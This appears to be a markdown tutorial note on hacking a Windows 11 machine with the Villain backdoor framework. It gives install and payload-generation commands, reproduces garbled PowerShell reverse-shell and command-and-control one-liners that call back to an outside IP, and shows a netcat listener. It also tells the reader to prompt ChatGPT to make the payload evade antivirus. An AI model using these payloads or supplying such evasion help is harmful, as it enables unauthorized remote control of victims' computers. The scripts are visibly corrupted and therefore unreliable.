# ♦ Day 16
</br>
</br>

## ◙ ***Note***
 </br>
  There is an update in rockyou.txt file containing a far better number of word combinations 
  </br>
  
  ⇨ [Rockyou.txt](https://github.com/hkphh/rockyou2024.txt)
 </br>
# ♦ Hacking Windows 11 :
   ***• Introducing Villan Framework***
   </br>
      Villain is a Windows & Linux backdoor generator and multi-session handler that allows users to connect with sibling servers (other machines running Villain) and share their backdoor sessions, handy for working as a team. [Villan](https://github.com/keralahacker/Villain/)
   </br>
   ⇨ In this Sessioin we will be learning to how to use Villan framework to get into OR Hack a Windows 11 device 
   </br>
   </br>
### ◙ Step-By-Step Guide 
</br >

### • 1. Installation of Villan Framework :

    git clone https://github.com/t3l3machus/Villain
    cd ./Villain
    pip3 install -r requirements.txt

• Now add the x parameter in the file and exicute it:

    chmod +x villan.py

• Now exicute with python

    python3 villan.py

> For details use "help" command


### • 2. Generate a paylaod : 

 To understand how to generate a paylaod we will use the command 

    help generate

• Generate a paylaod from the example for the wwindows

    generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode

 Now try runing the generated payload in powershell

</br>

***◙ Improving the Payload***
 As we can see that the paylaod has been shot down by the AV so we have to do some changes in tht so it can't be detected by the AV.
 </br>
  </br>
 • For doingb such changes we will be using Our beloved ***"CHAT GPT"*** in such a manner >
  </br>

 ### • 1. Step 1
      >give the payload< analyse this code and modify the code to be more AV proof need this code in ps1 file

</br>

 ### • 2. Step 2
       "Start-Process SPSHOME\powershell.exe -ArgumentList {$client = New-Object System.Net.Sockets.TCPClientC172.29.234.6?,4443);$stream = $client.GetStream();[byte0)$bytes = $stream.Read($bytes, O, $bytes.Length)) -ne O)(;$data = (New-Object -TypeName = (iex $data 2>&1 | Out-String );$sendback2 = Ssendback + 'PS • + (pwd).Path + ';Ssendbyte = -WindowStyle Hidden"

 </br>

  ### • 3. Step 3
          "Start-Process SPSHOME\powershell.exe -ArgumentList {$s="SERVERlP•••$i='*SESSlONlD•••$p='http•JT;Sv=lnvoke-RestMethod -UseBasicParsing -Uri -Headers (Strue){$c=(lnvoke-RestMethod -UseBasicParsing -Uri Sp$s/ -Headers (Sc -ne 'None') {$r=lnvoke-Expression Sc -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=lnvoke-RestMethod -Uri -Method POST -Headers -Body -join ' sleep *FREQ'}} -WindowStyle Hidden"

</br>

 ### • 4. Step 4
         "Replace the placeholders like 'SERVERlP' and '*SESSIONlD' with actual endpoint paths and IDs before executing the script. Remove all those above and now I am using netcat to connect with the TCP connection."


#♦ Connect Via Netcat :
</br> 
### • 1. Open a new tab and start the netcat listener in that terminasl.

    nc -lvnp <port no>

  And now open the .ps1 file in powershell.

If any other problem occurs try using AI and other gpt's to further improve or debug your payload
